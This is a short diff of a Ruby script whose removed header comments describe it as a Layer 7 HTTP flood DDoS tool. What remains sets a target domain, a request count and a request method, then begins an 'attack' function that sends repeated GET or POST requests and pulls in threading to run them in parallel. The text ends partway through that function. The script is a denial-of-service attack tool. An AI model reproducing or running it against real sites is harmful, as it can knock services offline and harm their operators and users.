@@ -1,15 +1,10 @@
-## Bora BOZDOGAN
-## Ruby Layer7 (HTTP Flood) DDOS
-
 require "http"
 require "thread"
 
-## configuration ##
 domain  = 'https://example.com'
 count   = 100
 type    = "GET"
 
-## configuration ##
 def attack(domain,type)
 if type == "POST"
 code = HTTP.post(domain).code
